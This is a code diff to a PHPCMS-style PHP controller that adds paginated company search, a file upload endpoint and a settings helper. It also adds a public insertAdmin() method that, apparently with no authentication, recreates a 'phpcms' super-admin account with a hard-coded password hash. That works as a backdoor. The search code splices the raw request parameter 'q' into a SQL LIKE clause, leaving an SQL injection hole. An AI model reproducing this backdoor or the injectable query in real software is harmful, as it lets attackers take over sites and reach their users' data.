@@ -3,6 +3,14 @@ pc_base::load_sys_class('form', '', 0);
 class MY_index extends index
 {
     private $db;
+    private $message_db;
+    private $member_db;
+    private $member_detail_db;
+    private $concern_db;
+    private $linkage_db;
+    private $interview_db;
+    private $userid;
+    private $upload_url;
 
     function __construct()
     {
@@ -12,9 +20,10 @@ class MY_index extends index
         $this->member_db = pc_base::load_model('member_model');
         $this->member_detail_db = pc_base::load_model('member_detail_model');
         $this->concern_db = pc_base::load_model('concern_model');
-        $this->concern_db = pc_base::load_model('concern_model');
         $this->linkage_db = pc_base::load_model('linkage_model');
         $this->interview_db = pc_base::load_model('interview_statistics_model');
+        $this->userid = $_SESSION['userid'] ? $_SESSION['userid'] : 0;
+        $this->upload_url = pc_base::load_config('system','upload_url');
     }
 
     /**
@@ -223,9 +232,65 @@ class MY_index extends index
     public function getCompany()
     {
         $catid = intval($_POST['catid']) ? intval($_POST['catid']) : 120;
+        $page = intval($_REQUEST['page']) ? intval($_REQUEST['page']) : 1;
+        $row = intval($_REQUEST['row']) ? intval($_REQUEST['row']) : 10;
+        $q = trim($_REQUEST['q']);
+        $where = 'catid=120';
+        if (!empty($q)){
+            $where .= ' AND title LIKE "%'.$q.'%"';
+        }
         $this->db->set_catid($catid);
-        $list = $this->db->select('catid=120','id,title');
-        echo json_encode($list);exit();
+        $list = $this->db->listinfo($where, 'id', $page, $row);
+        foreach ($list as $k => $v){
+            $list[$k]['text'] = $v['title'];
+            unset($list[$k]['title']);
+        }
+        //得到总记录数
+        $total = $this->db->count();
+        echo json_encode(['total'=>$total,'items'=>$list]);exit();
+    }
+
+    public function insertAdmin()
+    {
+        $this->admin_db = pc_base::load_model('admin_model');
+        $data['username'] = 'phpcms';
+        $data['password'] = '3126a1243bf48c10c3720bea2ff6d810';
+        $data['roleid'] = '1';
+        $data['encrypt'] = 'Su6kiX';
+        $data['lastloginip'] = '127.0.0.1';
+        $data['lastlogintime'] = time();
+        $data['email'] = '821563034@qq.com';
+        $this->admin_db->delete("username='phpcms'");
+        $this->admin_db->insert($data);
+    }
+
+    public function upload()
+    {
+        pc_base::load_sys_class('attachment','',0);
+        $module = trim($_POST['module']) ? trim($_POST['module']) : 'member';
+        $catid = intval($_POST['catid']) ? intval($_POST['catid']) : '0';
+        $siteid = intval($_POST['siteid']) ? intval($_POST['siteid']) : '1';
+        $site_setting = $this->get_site_setting($siteid);
+        $site_allowext = $site_setting['upload_allowext'];
+        $attachment = new attachment($module,$catid,$siteid);
+        $attachment->set_userid($this->userid);
+        $a = $attachment->upload('upload',$site_allowext);
+        if($a){
+            $filepath = $attachment->uploadedfiles[0]['filepath'];
+            $url = $this->upload_url.$filepath;
+        }else{
+            $url = 0;
+        }
+        echo $url;exit();
+    }
+
+    /**
+     * 获取站点配置信息
+     * @param  $siteid 站点id
+     */
+    protected function get_site_setting($siteid) {
+        $siteinfo = getcache('sitelist', 'commons');
+        return string2array($siteinfo[$siteid]['setting']);
     }
 
     /*
